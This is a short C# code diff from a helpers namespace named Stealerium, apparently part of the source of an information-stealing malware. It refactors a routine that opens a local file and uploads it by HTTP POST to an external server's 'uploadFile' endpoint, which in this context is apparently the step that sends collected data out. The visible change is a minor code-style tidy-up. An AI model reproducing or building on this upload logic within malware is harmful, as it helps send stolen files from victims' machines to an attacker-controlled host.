@@ -21,8 +21,10 @@ namespace Stealerium.Helpers
                 var optimalServer = GetServer(client);
                 var endpoint = ServiceEndpoint.Replace("{server}", await optimalServer);
 
-                var content = new MultipartFormDataContent();
-                content.Add(new StreamContent(File.OpenRead(file)), "file", Path.GetFileName(file));
+                var content = new MultipartFormDataContent
+                {
+                    { new StreamContent(File.OpenRead(file)), "file", Path.GetFileName(file) }
+                };
 
                 var response = await client.PostAsync(endpoint + "uploadFile", content);
                 var responseBody = await response.Content.ReadAsStringAsync();
